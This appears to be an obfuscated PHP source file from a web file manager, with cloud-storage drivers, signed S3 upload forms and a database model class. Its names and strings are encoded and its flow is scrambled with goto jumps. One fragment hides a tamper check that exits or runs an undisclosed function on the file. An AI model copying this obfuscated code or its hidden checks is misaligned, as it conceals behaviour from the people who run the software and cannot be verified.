$À°•ş»[12], $À°•ş»[32] => get_path_this($Œ»ôÍÂû[0]), $À°•ş»[1517] => $Œ»ôÍÂû[2]))); $ÖÃÒ‰ä» = $ôœ÷™¿õ[$¸¸½Ïš]; if (!$ÖÃÒ‰ä») { return !1; } $²€¯¬ú± = $ÖÃÒ‰ä»[$À°•ş»[1289]]; $ñ”ˆŸŸ = explode($À°•ş»[50], $ÖÃÒ‰ä»[$À°•ş»[1549]]); foreach ($ñ”ˆŸŸ as $Ş­ŠÕúŠ) { $»õœ©„ú = $this->pathApiEncode(_get($²€¯¬ú±, $Ş­ŠÕúŠ)); array_set_value($²€¯¬ú±, $Ş­ŠÕúŠ, $»õœ©„ú); } if ($¸¸½Ïš == $À°•ş»[1483] && trim($ÖÃÒ‰ä»[$À°•ş»[1289]][$À°•ş»[87]], $À°•ş»[8]) == trim($this->_config[$À°•ş»[1290]], $À°•ş»[8])) { return $ÖÃÒ‰ä»[$À°•ş»[1289]][$À°•ş»[87]]; } $ø“ıŞø = $this->requestSend($ÖÃÒ‰ä»[$À°•ş»[1548]], $²€¯¬ú±); if (!$ø“ıŞø) { return !1; } $ùƒŞÔâ = $ø“ıŞø[$À°•ş»[1326]]; if ($ÖÃÒ‰ä»[$À°•ş»[1560]]) { $ùƒŞÔâ = _get($ø“ıŞø, $ÖÃÒ‰ä»[$À°•ş»[1560]]); } if (is_string($ùƒŞÔâ) && !$ÖÃÒ‰ä»[$À°•ş»[1551]]) { return $this->pathApiDecode($ùƒŞÔâ); } if (!is_array($ùƒŞÔâ) || !$ùƒŞÔâ) { return $ùƒŞÔâ; } $Ú¹Óàüğ = explode($À°•ş»[50], $ÖÃÒ‰ä»[$À°•ş»[1551]]); foreach ($Ú¹Óàüğ as $Ş­ŠÕúŠ) { $µı¯Ü¼‚ = explode($À°•ş»[10], $Ş­ŠÕúŠ); $ï¹•¹°ˆ = array_search($À°•ş»[1569], $µı¯Ü¼‚); if ($ï¹•¹°ˆ === !1) { $»õœ©„ú = $this->pathApiDecode(_get($ùƒŞÔâ, $Ş­ŠÕúŠ)); array_set_value($ùƒŞÔâ, $Ş­ŠÕúŠ, $»õœ©„ú); if ($¸¸½Ïš == $À°•ş»[1540] && $Ş­ŠÕúŠ == $À°•ş»[87]) { $this->pathInfoParse($ùƒŞÔâ); } if ($¸¸½Ïš == $À°•ş»[1502] && $Ş­ŠÕúŠ == $À°•ş»[1570]) { $this->pathInfoParse($ùƒŞÔâ[$À°•ş»[1477]]); } if ($¸¸½Ïš == $À°•ş»[1502]) { $ùƒŞÔâ[$À°•ş»[1571]] = array(); } continue; } $ì³ êÅ¯ = implode($À°•ş»[10], array_slice($µı¯Ü¼‚, $ï¹•¹°ˆ + 1)); $ôäÛ¥¯¯ = array(); if ($ï¹•¹°ˆ === 0) { $ôäÛ¥¯¯ =& $ùƒŞÔâ; } if ($ï¹•¹°ˆ === 1) { $ôäÛ¥¯¯ =& $ùƒŞÔâ[$µı¯Ü¼‚[0]]; } if ($ï¹•¹°ˆ === 2) { $ôäÛ¥¯¯ =& $ùƒŞÔâ[$µı¯Ü¼‚[0]][$µı¯Ü¼‚[1]]; } foreach ($ôäÛ¥¯¯ as $Ş­ŠÕúŠ => $·°ˆ¬Ğà) { $»õœ©„ú = $this->pathApiDecode(_get($·°ˆ¬Ğà, $ì³ êÅ¯)); array_set_value($ôäÛ¥¯¯[$Ş­ŠÕúŠ], $ì³ êÅ¯, $»õœ©„ú); $this->pathInfoParse($ôäÛ¥¯¯[$Ş­ŠÕúŠ]); } unset($ôäÛ¥¯¯); } return $ùƒŞÔâ; } private function requestMakeUrl($Éû¢–º“, $ÈâˆÁ© = '') { $€•Ü´Äæ =& $_SERVER[¿ÈˆÑ¸ä]; $÷¬ïœ¾± = $this->_config; if (!$this->authToken) { return !1; } $€ÓÑË = $this->requestQuery($ÈâˆÁ©, !0) . $€•Ü´Äæ[1572] . $this->authToken; $÷Á£²Å¹ = rtrim($÷¬ïœ¾±[$€•Ü´Äæ[576]][$€•Ü´Äæ[1519]], $€•Ü´Äæ[8]) . $€•Ü´Äæ[1573] . $Éû¢–º“; return $÷Á£²Å¹ . $€•Ü´Äæ[1574] . rawurlencode($÷¬ïœ¾±[$€•Ü´Äæ[576]][$€•Ü´Äæ[1491]]) . $€ÓÑË; } private function requestAuthToken() { $ã›â—Ê =& $_SERVER[¿ÈˆÑ¸ä]; $•ç» ¿¦ = $this->_config; if (!$•ç» ¿¦) { return !1; } $–º¾Æó’ = _get($•ç» ¿¦, $ã›â—Ê[1575]); $¿†œó‘³ = array_find_by_field($•ç» ¿¦[$ã›â—Ê[576]][$ã›â—Ê[1531]], $ã›â—Ê[1576], $–º¾Æó’); if (!$¿†œó‘³) { return !1; } $Äì×ñ´ş = $¿†œó‘³[$ã›â—Ê[1577]] . $ã›â—Ê[1578] . $¿†œó‘³[$ã›â—Ê[1280]]; $ÄìÛòÒç = $ã›â—Ê[1579] . $this->pathParse[$ã›â—Ê[483]] . $ã›â—Ê[473] . $Äì×ñ´ş; $°Ğó› ë = Cache::get($ÄìÛòÒç); if ($°Ğó› ë) { return $°Ğó› ë; } $°Ğó› ë = Mcrypt::encode($Äì×ñ´ş, $ã›â—Ê[1580]); Cache::set($ÄìÛòÒç, $°Ğó› ë, 3600 * 24 * 60); return $°Ğó› ë; } private function requestQuery($­È™ùÅ¸ = '', $ÅÉ¥¹õÖ = false) { if (!$­È™ùÅ¸ || !is_array($­È™ùÅ¸)) { return $­È™ùÅ¸; } foreach ($­È™ùÅ¸ as $‹Ïéó´“ => $‡æ¹Àœ–) { if (is_array($‡æ¹Àœ–)) { $­È™ùÅ¸[$‹Ïéó´“] = json_encode($‡æ¹Àœ–); } } return $ÅÉ¥¹õÖ ? $_SERVER[¿ÈˆÑ¸ä][285] . http_build_query($­È™ùÅ¸) : $­È™ùÅ¸; } private function requestSend($÷ğ£Ùœ, $“É„‚û—) { $»ÎÅÈª¿ =& $_SERVER[¿ÈˆÑ¸ä]; $ÇŠÖµ›ô = $this->requestMakeUrl($÷ğ£Ùœ); if (!$ÇŠÖµ›ô) { return !1; } $ŞÇÃÙšê = url_request($ÇŠÖµ›ô, $»ÎÅÈª¿[289], $this->requestQuery($“É„‚û—), !1, !1, !0); $™ºëºÂ¾ = $ŞÇÃÙšê[$»ÎÅÈª¿[1326]]; if (!is_array($™ºëºÂ¾) || !$™ºëºÂ¾ || !$™ºëºÂ¾[$»ÎÅÈª¿[1336]] || intval($™ºëºÂ¾[$»ÎÅÈª¿[1336]]) > 500) { $“ñ¥áù = is_array($™ºëºÂ¾) ? $™ºëºÂ¾[$»ÎÅÈª¿[1326]] : $™ºëºÂ¾ . $»ÎÅÈª¿[12]; if (!$ŞÇÃÙšê[$»ÎÅÈª¿[833]]) { $“ñ¥áù .= $»ÎÅÈª¿[1581] . $ŞÇÃÙšê[$»ÎÅÈª¿[1336]] . $»ÎÅÈª¿[176]; } IO::errorTips($“ñ¥áù, !1); return !1; } return $™ºëºÂ¾; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¬áÊÛ›‰) { parent::__construct($¬áÊÛ›‰); $this->setSignVersion($_SERVER[¿ÈˆÑ¸ä][248]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($€ü·§ËÍ) { parent::__construct($€ü·§ËÍ); $this->setSignVersion($_SERVER[¿ÈˆÑ¸ä][248]); } public function uploadFormData($ö÷Ú·€á, $İ‚¼ÔˆÅ = 3600) { $â¸Ê¿¯ğ =& $_SERVER[¿ÈˆÑ¸ä]; $¾³Ú™¿ = $â¸Ê¿¯ğ[230]; $ÆûûÉ­¿ = $â¸Ê¿¯ğ[258]; $õÛ–á·Ù = $â¸Ê¿¯ğ[62]; $ÉŒ¦ŸˆÏ = gmdate($â¸Ê¿¯ğ[259]); $‚ƒè®ñª = gmdate($â¸Ê¿¯ğ[260]); $­Ÿ§¡®£ = $â¸Ê¿¯ğ[261]; $îêª “ç = $İ‚¼ÔˆÅ . $â¸Ê¿¯ğ[12]; $Ğçê÷º = $â¸Ê¿¯ğ[262]; $ğÂíº©† = array($this->accessKey, $‚ƒè®ñª, $this->region, $õÛ–á·Ù, $­Ÿ§¡®£); $ÜÙ¶á” = implode($â¸Ê¿¯ğ[8], $ğÂíº©†); $„Óµï = array($â¸Ê¿¯ğ[263] => gmdate($â¸Ê¿¯ğ[1461], strtotime($â¸Ê¿¯ğ[265])), $â¸Ê¿¯ğ[266] => array(array($â¸Ê¿¯ğ[267] => $this->bucket), array($â¸Ê¿¯ğ[307] => $¾³Ú™¿), array($â¸Ê¿¯ğ[268], $â¸Ê¿¯ğ[269], $â¸Ê¿¯ğ[12]), array($â¸Ê¿¯ğ[268], $â¸Ê¿¯ğ[270], $â¸Ê¿¯ğ[12]), array($â¸Ê¿¯ğ[268], $â¸Ê¿¯ğ[308], $â¸Ê¿¯ğ[12]), array($â¸Ê¿¯ğ[271] => $Ğçê÷º), array($â¸Ê¿¯ğ[272] => $ÜÙ¶á”), array($â¸Ê¿¯ğ[273] => $ÆûûÉ­¿), array($â¸Ê¿¯ğ[274] => $ÉŒ¦ŸˆÏ), array($â¸Ê¿¯ğ[275] => $îêª “ç))); $‘‘Îãò = base64_encode(json_encode($„Óµï)); $ç”Ñ¦¬ = hash_hmac($â¸Ê¿¯ğ[276], $‚ƒè®ñª, $â¸Ê¿¯ğ[277] . $this->secret, !0); $å¥«Ùğ = hash_hmac($â¸Ê¿¯ğ[276], $this->region, $ç”Ñ¦¬, !0); $Ì•ê¶õ° = hash_hmac($â¸Ê¿¯ğ[276], $õÛ–á·Ù, $å¥«Ùğ, !0); $»ŸË»Æä = hash_hmac($â¸Ê¿¯ğ[276], $­Ÿ§¡®£, $Ì•ê¶õ°, !0); $âç’ŠåØ = hash_hmac($â¸Ê¿¯ğ[276], $‘‘Îãò, $»ŸË»Æä); $¨³¶»êÙ = array($â¸Ê¿¯ğ[247] => $â¸Ê¿¯ğ[12], $â¸Ê¿¯ğ[295] => $â¸Ê¿¯ğ[12], $â¸Ê¿¯ğ[307] => $¾³Ú™¿, $â¸Ê¿¯ğ[271] => $Ğçê÷º, $â¸Ê¿¯ğ[278] => $‘‘Îãò, $â¸Ê¿¯ğ[309] => $ÜÙ¶á”, $â¸Ê¿¯ğ[310] => $ÆûûÉ­¿, $â¸Ê¿¯ğ[311] => $ÉŒ¦ŸˆÏ, $â¸Ê¿¯ğ[312] => $îêª “ç, $â¸Ê¿¯ğ[313] => $âç’ŠåØ, $â¸Ê¿¯ğ[207] => $this->getHost()); return $¨³¶»êÙ; } } goto e‚ÔÚ¤Ì®; AôÛ›¹å¡ö: $_size = $_SERVER[¿ÈˆÑ¸ä][1606]; if ($_SERVER[$_SERVER[¿ÈˆÑ¸ä][962]] != $_size($_file)) { $_getc = $_SERVER[¿ÈˆÑ¸ä][964]; $_getfile = $_SERVER[$_SERVER[¿ÈˆÑ¸ä][965]] . $_SERVER[¿ÈˆÑ¸ä][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¿ÈˆÑ¸ä][286], $_getfilec); if (count($_getarrs) < $_SERVER[¿ÈˆÑ¸ä][699]) { $exit = $_SERVER[¿ÈˆÑ¸ä][967]; $exit(); } $_act = $_SERVER[¿ÈˆÑ¸ä][968]; $_act($_file); } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($´®äÔ) { parent::__construct($´®äÔ); $this->setSignVersion($_SERVER[¿ÈˆÑ¸ä][248]); } public function uploadFormData($ûÔÙÌÄ, $’…ïîÚš = 3600) { return $this->uploadFormDataV2($ûÔÙÌÄ, $’…ïîÚš); } } goto câ’ÁŠ‹Ñ‡; c‹…é×†¹¯: define($_SERVER[¿ÈˆÑ¸ä][0], $_SERVER[¿ÈˆÑ¸ä][1]); $_SERVER[éíèá¤ê] = explode($_SERVER[¿ÈˆÑ¸ä][2], gzinflate(substr($_SERVER[¿ÈˆÑ¸ä][3], 10, -8))); function binCheckEq($êï•Ÿâ„, $¹òñ¥»¥) { return $êï•Ÿâ„ == $¹òñ¥»¥; } goto a”Ì†Ì·Â­; CÅ†Ì›ÀÄ: define($_SERVER[¿ÈˆÑ¸ä][321], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\157\162\x64\145\x72", "\x61\x6c\x69\141\163", "\150\141\166\x69\x6e\x67", "\x67\x72\x6f\x75\160", "\154\x6f\x63\x6b", "\x64\151\x73\x74\x69\156\x63\x74", "\141\x75\164\x6f", "\146\151\154\164\145\x72", "\x76\141\154\x69\x64\x61\164\145", "\x72\x65\163\x75\154\164", "\142\151\x6e\x64", "\164\x6f\153\145\156"); public function __construct($İ¢Ù = '', $£Ÿ—£±Ï = '', $ıÇ ´ñú = '') { $¡àŒö½‘ =& $_SERVER[¿ÈˆÑ¸ä]; $this->_initialize(); if (!empty($İ¢Ù)) { if (strpos($İ¢Ù, $¡àŒö½‘[10])) { list($this->dbName, $this->name) = explode($¡àŒö½‘[10], $İ¢Ù); } else { $this->name = $İ¢Ù; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($£Ÿ—£±Ï)) { $this->tablePrefix = $¡àŒö½‘[12]; } elseif ($¡àŒö½‘[12] != $£Ÿ—£±Ï) { $this->tablePrefix = $£Ÿ—£±Ï; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¡àŒö½‘[322]); } $this->db(0, empty($this->connection) ? $ıÇ ´ñú : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ù”îÜó² =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($this->fields)) { if (think_config($ù”îÜó²[323])) { $Ğ†³…Ğ¤ = $this->dbName ? $this->dbName : think_config($ù”îÜó²[324]); $ÒÒ……´‡ = think_var_cache($ù”îÜó²[325] . strtolower(get_path_this($Ğ†³…Ğ¤) . $ù”îÜó²[10] . $this->name)); if ($ÒÒ……´‡) { $êØÓŞß = think_config($ù”îÜó²[326]); if (empty($êØÓŞß) || $ÒÒ……´‡[$ù”îÜó²[327]] == $êØÓŞß) { $this->fields = $ÒÒ……´‡; return; } } } $this->flush(); } } public function flush() { $›ØĞ‹ÊÕ =& $_SERVER[¿ÈˆÑ¸ä]; $this->db->setModel($this->name); $âšÖÈã¥ = $this->db->getFields($this->getTableName()); if (!$âšÖÈã¥) { return !1; } $this->fields = array_keys($âšÖÈã¥); $this->fields[$›ØĞ‹ÊÕ[328]] = !1; foreach ($âšÖÈã¥ as $çî¡Ëª => $Û¥òù–) { $ÜËöæ™[$çî¡Ëª] = $Û¥òù–[$›ØĞ‹ÊÕ[33]]; if ($Û¥òù–[$›ØĞ‹ÊÕ[39]]) { $this->fields[$›ØĞ‹ÊÕ[329]] = $çî¡Ëª; if ($Û¥òù–[$›ØĞ‹ÊÕ[42]]) { $this->fields[$›ØĞ‹ÊÕ[328]] = !0; } } } $this->fields[$›ØĞ‹ÊÕ[330]] = $ÜËöæ™; if (think_config($›ØĞ‹ÊÕ[326])) { $this->fields[$›ØĞ‹ÊÕ[327]] = think_config($›ØĞ‹ÊÕ[326]); } if (think_config($›ØĞ‹ÊÕ[323])) { $ˆ´¡›à¹ = $this->dbName ? $this->dbName : think_config($›ØĞ‹ÊÕ[324]); think_var_cache($›ØĞ‹ÊÕ[325] . strtolower(get_path_this($ˆ´¡›à¹) . $›ØĞ‹ÊÕ[10] . $this->name), $this->fields); } } public function switchModel($ÖšËËŞ, $¡Óñıª = array()) { $Ê¥ÕÔ¥˜ =& $_SERVER[¿ÈˆÑ¸ä]; $Ïæ§ˆ¦¼ = ucwords(strtolower($ÖšËËŞ)) . $Ê¥ÕÔ¥˜[331]; if (!class_exists($Ïæ§ˆ¦¼)) { think_exception($Ïæ§ˆ¦¼ . think_lang($Ê¥ÕÔ¥˜[332])); } $this->_extModel = new $Ïæ§ˆ¦¼($this->name); if (!empty($¡Óñıª)) { foreach ($¡Óñıª as $Ê¹ƒüçÃ) { $this->_extModel->setProperty($Ê¹ƒüçÃ, $this->{$Ê¹ƒüçÃ}); } } return $this->_extModel; } public function __set($Â èÍí, $»ê”ãŠö) { $this->data[$Â èÍí] = $»ê”ãŠö; } public function __get($æ©¨òëç) { return isset($this->data[$æ©¨òëç]) ? $this->data[$æ©¨òëç] : null; } public function __isset($¢°‡‹±÷) { return isset($this->data[$¢°‡‹±÷]); } public function __unset($ËŸûù«š) { unset($this->data[$ËŸûù«š]); } public function __call($ÒÌÌıÀ¹, $ûªŸµ±) { $Ôè×İÏÁ =& $_SERVER[¿ÈˆÑ¸ä]; if (in_array(strtolower($ÒÌÌıÀ¹), $this->methods, !0)) { $this->options[strtolower($ÒÌÌıÀ¹)] = $ûªŸµ±[0]; return $this; } elseif (in_array(strtolower($ÒÌÌıÀ¹), array($Ôè×İÏÁ[333], $Ôè×İÏÁ[334], $Ôè×İÏÁ[335], $Ôè×İÏÁ[336], $Ôè×İÏÁ[337]), !0)) { $‹á¸Â¤— = isset($ûªŸµ±[0]) ? $ûªŸµ±[0] : $Ôè×İÏÁ[221]; $‹á¸Â¤— = $this->db->parseKey($‹á¸Â¤—); return $this->getField(strtoupper($ÒÌÌıÀ¹) . $Ôè×İÏÁ[338] . $‹á¸Â¤— . $Ôè×İÏÁ[339] . $ÒÌÌıÀ¹, $Ôè×İÏÁ[333]); } elseif (strtolower(substr($ÒÌÌıÀ¹, 0, 5)) == $Ôè×İÏÁ[340]) { $‹á¸Â¤— = think_parse_name(substr($ÒÌÌıÀ¹, 5)); $°¶ãÓ¨[$‹á¸Â¤—] = $ûªŸµ±[0]; return $this->where($°¶ãÓ¨)->find(); } elseif (strtolower(substr($ÒÌÌıÀ¹, 0, 10)) == $Ôè×İÏÁ[341]) { $°öö±Ù° = think_parse_name(substr($ÒÌÌıÀ¹, 10)); $°¶ãÓ¨[$°öö±Ù°] = $ûªŸµ±[0]; return $this->where($°¶ãÓ¨)->getField($ûªŸµ±[1]); } elseif (isset($this->_scope[$ÒÌÌıÀ¹])) { return $this->scope($ÒÌÌıÀ¹, $ûªŸµ±[0]); } elseif (method_exists($this, $ÒÌÌıÀ¹) || method_exists($this, $Ôè×İÏÁ[342] . $ÒÌÌıÀ¹)) { array_unshift($ûªŸµ±, $ÒÌÌıÀ¹); return call_user_func_array(array($this, $Ôè×İÏÁ[343]), $ûªŸµ±); } else { return call_user_func_array(array(parent, $ÒÌÌıÀ¹), $ûªŸµ±); } } protected function call() { $‹óÌ¿ =& $_SERVER[¿ÈˆÑ¸ä]; $ñ†–õÁ« = func_get_args(); $Î”Ñ·ª = array_shift($ñ†–õÁ«); $Å¥–É¤ = $Î”Ñ·ª; if (is_array($Î”Ñ·ª)) { $Å¥–É¤ = $Î”Ñ·ª[1]; $Î”Ñ·ª = $Î”Ñ·ª[0]; } $“³±îíÉ = count($ñ†–õÁ«) - 1; if (isset($ñ†–õÁ«[$“³±îíÉ]) && $ñ†–õÁ«[$“³±îíÉ] === $Î”Ñ·ª) { think_exception(__CLASS__ . $‹óÌ¿[4] . $Î”Ñ·ª . think_lang($‹óÌ¿[344])); return; } $ñ†–õÁ«[] = $Î”Ñ·ª; if (method_exists($this, $‹óÌ¿[345])) { $Éäª®™ø = call_user_func_array(array($this, $‹óÌ¿[346]), array($Å¥–É¤, $ñ†–õÁ«)); if (!is_null($Éäª®™ø) && $Éäª®™ø !== !1) { return $Éäª®™ø; } } $×î²òŠ = !1; if (method_exists($this, $Î”Ñ·ª)) { $×î²òŠ = call_user_func_array(array($this, $Î”Ñ·ª), $ñ†–õÁ«); } if (method_exists($this, $‹óÌ¿[347])) { $Éäª®™ø = call_user_func_array(array($this, $‹óÌ¿[348]), array($Å¥–É¤, $ñ†–õÁ«, $×î²òŠ)); if ($Éäª®™ø) { return $Éäª®™ø; } } return $×î²òŠ; } protected function _initialize() { } protected function _facade($¡Ñ†°ÛÔ) { $ÕÖ·ÂØ† =& $_SERVER[¿ÈˆÑ¸ä]; if (!empty($this->fields)) { foreach ($¡Ñ†°ÛÔ as $ŸÔ¿ŠÂü => $•Ü³‘å) { if (is_array($this->fields) && !in_array($ŸÔ¿ŠÂü, $this->fields, !0)) { unset($¡Ñ†°ÛÔ[$ŸÔ¿ŠÂü]); } elseif (is_scalar($•Ü³‘å)) { $this->_parseType($¡Ñ†°ÛÔ, $ŸÔ¿ŠÂü); } } } if (!empty($this->options[$ÕÖ·ÂØ†[349]])) { $¡Ñ†°ÛÔ = array_map($this->options[$ÕÖ·ÂØ†[349]], $¡Ñ†°ÛÔ); unset($this->options[$ÕÖ·ÂØ†[349]]); } $this->_beforeWrite($¡Ñ†°ÛÔ); return $¡Ñ†°ÛÔ; } protected function _beforeWrite(&$Æ€¸Æã) { } public function add($Ü…æˆ¦ù = '', $ÌâŠü½½ = array(), $¼›İÈ”á = false) { if (empty($Ü…æˆ¦ù)) { if (!empty($this->data)) { $Ü…æˆ¦ù = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¿ÈˆÑ¸ä][350]); return !1; } } $ÌâŠü½½ = $this->_parseOptions($ÌâŠü½½); $Ü…æˆ¦ù = $this->_facade($Ü…æˆ¦ù); if (!1 === $this->_beforeInsert($Ü…æˆ¦ù, $ÌâŠü½½)) { return !1; } $·’àÏ²İ = $this->db->insert($Ü…æˆ¦ù, $ÌâŠü½½, $¼›İÈ”á); if (!1 !== $·’àÏ²İ) { $£Îâù = $this->getLastInsID(); if ($£Îâù) { $Ü…æˆ¦ù[$this->getPk()] = $£Îâù; $this->_after_insert($Ü…æˆ¦ù, $ÌâŠü½½); return $£Îâù; } $this->_after_insert($Ü…æˆ¦ù, $ÌâŠü½½); } return $·’àÏ²İ; } protected function _beforeInsert(&$¤õ¢á¬‘, $—ôÎò¿) { } protected function _after_insert($‘¡Ç±Í‰, $ÆØÂàèÎ) { } public function addAll($€â¿àµ, $‰¿×è´ø = array(), $ñµÆƒú» = false) { $ÖëïÉ‡Œ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($€â¿àµ)) { $this->error = think_lang($ÖëïÉ‡Œ[350]); return !1; } $‰¿×è´ø = $this->_parseOptions($‰¿×è´ø); foreach ($€â¿àµ as $á¬¡°ìÔ => $õãåè³÷) { $€â¿àµ[$á¬¡°ìÔ] = $this->_facade($õãåè³÷); } if (method_exists($this->db, $ÖëïÉ‡Œ[351])) { $‰¾‹›¤ô = $this->db->insertAll($€â¿àµ, $‰¿×è´ø, $ñµÆƒú»); } else { $this->startTrans(); foreach ($€â¿àµ as $á¬¡°ìÔ => $õãåè³÷) { $‰¾‹›¤ô = $this->db->insert($õãåè³÷, $‰¿×è´ø, $ñµÆƒú»); } $this->commit(); } if (!1 !== $‰¾‹›¤ô) { $şì³ñºâ = $this->getLastInsID(); if ($şì³ñºâ) { return $şì³ñºâ; } } return $‰¾‹›¤ô; } public function selectAdd($œÕÙˆø» = '', $¨òñ†Øë = '', $ğì™È¶‚ = array()) { $í„Ùæ¼ú =& $_SERVER[¿ÈˆÑ¸ä]; $ğì™È¶‚ = $this->_parseOptions($ğì™È¶‚); if (!1 === ($Ë²Şƒ® = $this->db->selectInsert($œÕÙˆø» ? $œÕÙˆø» : $ğì™È¶‚[$í„Ùæ¼ú[352]], $¨òñ†Øë ? $¨òñ†Øë : $this->getTableName(), $ğì™È¶‚))) { $this->error = think_lang($í„Ùæ¼ú[353]); return !1; } else { return $Ë²Şƒ®; } } public function save($‘§¬‘¼ = '', $±³©ÇíÍ = array()) { $·İ¼«ÆÃ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($‘§¬‘¼)) { if (!empty($this->data)) { $‘§¬‘¼ = $this->data; $this->data = array(); } else { $this->error = think_lang($·İ¼«ÆÃ[350]); return !1; } } $‘§¬‘¼ = $this->_facade($‘§¬‘¼); $±³©ÇíÍ = $this->_parseOptions($±³©ÇíÍ); $Ñ»°ßˆü = $this->getPk(); if (!isset($±³©ÇíÍ[$·İ¼«ÆÃ[354]])) { if (isset($‘§¬‘¼[$Ñ»°ßˆü])) { $Ù´ˆŞ[$Ñ»°ßˆü] = $‘§¬‘¼[$Ñ»°ßˆü]; $±³©ÇíÍ[$·İ¼«ÆÃ[354]] = $Ù´ˆŞ; unset($‘§¬‘¼[$Ñ»°ßˆü]); } else { $this->error = think_lang($·İ¼«ÆÃ[353]); return !1; } } if (is_array($±³©ÇíÍ[$·İ¼«ÆÃ[354]]) && isset($±³©ÇíÍ[$·İ¼«ÆÃ[354]][$Ñ»°ßˆü])) { $©ğƒÚâ = $±³©ÇíÍ[$·İ¼«ÆÃ[354]][$Ñ»°ßˆü]; } if (!1 === $this->_beforeUpdate($‘§¬‘¼, $±³©ÇíÍ)) { return !1; } $íöİÆ«¤ = $this->db->update($‘§¬‘¼, $±³©ÇíÍ); if (!1 !== $íöİÆ«¤) { if (isset($©ğƒÚâ)) { $‘§¬‘¼[$Ñ»°ßˆü] = $©ğƒÚâ; } $this->_afterUpdate($‘§¬‘¼, $±³©ÇíÍ); } return $íöİÆ«¤; } protected function _beforeUpdate(&$éÚã¿Ö£, $á²—±ˆÛ) { } protected function _afterUpdate($çÁÇıçû, $Ô×«Ü¶Æ) { } public function delete($ÇšÃµ ™ = array()) { $ƒ£ Æ­³ =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($ÇšÃµ ™) && empty($this->options[$ƒ£ Æ­³[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $„öŒÛìœ = $this->getPk(); if (is_numeric($ÇšÃµ ™) || is_string($ÇšÃµ ™)) { if (strpos($ÇšÃµ ™, $ƒ£ Æ­³[50])) { $´¦°â‚[$„öŒÛìœ] = array($ƒ£ Æ­³[355], $ÇšÃµ ™); } else { $´¦°â‚[$„öŒÛìœ] = $ÇšÃµ ™; } $this->options[$ƒ£ Æ­³[354]] = $´¦°â‚; } $ÇšÃµ ™ = $this->_parseOptions(); if (is_array($ÇšÃµ ™[$ƒ£ Æ­³[354]]) && isset($ÇšÃµ ™[$ƒ£ Æ­³[354]][$„öŒÛìœ])) { $ÎÒî„Ñô = $ÇšÃµ ™[$ƒ£ Æ­³[354]][$„öŒÛìœ]; } $ó¢·óÑ‹ = $this->db->delete($ÇšÃµ ™); if (!1 !== $ó¢·óÑ‹) { $ª ÎĞÀ– = array(); if (isset($ÎÒî„Ñô)) { $ª ÎĞÀ–[$„öŒÛìœ] = $ÎÒî„Ñô; } $this->_after_delete($ª ÎĞÀ–, $ÇšÃµ ™); } return $ó¢·óÑ‹; } protected function _after_delete($‰¢…óöë, $”Ö„Î±Ù) { } public function select($ñªšâÉ = array()) { $Î°Ê„ß =& $_SERVER[¿ÈˆÑ¸ä]; if (is_string($ñªšâÉ) || is_numeric($ñªšâÉ)) { $È‘«ÖÈÄ = $this->getPk(); if (strpos($ñªšâÉ, $Î°Ê„ß[50])) { $†¶œã[$È‘«ÖÈÄ] = array($Î°Ê„ß[355], $ñªšâÉ); } else { $†¶œã[$È‘«ÖÈÄ] = $ñªšâÉ; } $this->options[$Î°Ê„ß[354]] = $†¶œã; } elseif (!1 === $ñªšâÉ) { $ñªšâÉ = $this->_parseOptions(); return $Î°Ê„ß[356] . $this->db->buildSelectSql($ñªšâÉ) . $Î°Ê„ß[357]; } $ñªšâÉ = $this->_parseOptions(); $ã“ïä°œ = $this->db->select($ñªšâÉ); if (!1 === $ã“ïä°œ) { return !1; } if (empty($ã“ïä°œ)) { return null; } $this->_afterSelect($ã“ïä°œ, $ñªšâÉ); return $ã“ïä°œ; } protected function _afterSelect(&$¿”õŞÑ, $©àÕ¢å•) { } public function buildSql($Æë‹ĞØµ = array()) { $ÓñºÚüÏ =& $_SERVER[¿ÈˆÑ¸ä]; $Æë‹ĞØµ = $this->_parseOptions($Æë‹ĞØµ); return $ÓñºÚüÏ[356] . $this->db->buildSelectSql($Æë‹ĞØµ) . $ÓñºÚüÏ[357]; } public function optionsValue($ø³İæşÖ = null) { if (is_null($ø³İæşÖ)) { return $this->options; } elseif (is_array($ø³İæşÖ)) { $this->options = array_merge($this->options, $ø³İæşÖ); } } protected function _parseOptions($²âÈ…Ò¯ = array()) { $ä¦„İÄ” =& $_SERVER[¿ÈˆÑ¸ä]; if (is_array($²âÈ…Ò¯)) { $²âÈ…Ò¯ = array_merge($this->options, $²âÈ…Ò¯); } $this->options = array(); if (!isset($²âÈ…Ò¯[$ä¦„İÄ”[358]])) { $²âÈ…Ò¯[$ä¦„İÄ”[358]] = $this->getTableName(); $¹¶Œº¥ò = $this->fields; } else { $¹¶Œº¥ò = $this->getDbFields(); } if (!empty($²âÈ…Ò¯[$ä¦„İÄ”[359]])) { $²âÈ…Ò¯[$ä¦„İÄ”[358]] .= $ä¦„İÄ”[53] . $²âÈ…Ò¯[$ä¦„İÄ”[359]]; } $²âÈ…Ò¯[$ä¦„İÄ”[360]] = $this->name; if (isset($²âÈ…Ò¯[$ä¦„İÄ”[354]]) && is_array($²âÈ…Ò¯[$ä¦„İÄ”[354]]) && !empty($¹¶Œº¥ò) && !isset($²âÈ…Ò¯[$ä¦„İÄ”[361]]) && !isset($²âÈ…Ò¯[$ä¦„İÄ”[358]])) { foreach ($²âÈ…Ò¯[$ä¦„İÄ”[354]] as $¼œÎñ’Æ => $ÀÊëí«º) { $¼œÎñ’Æ = 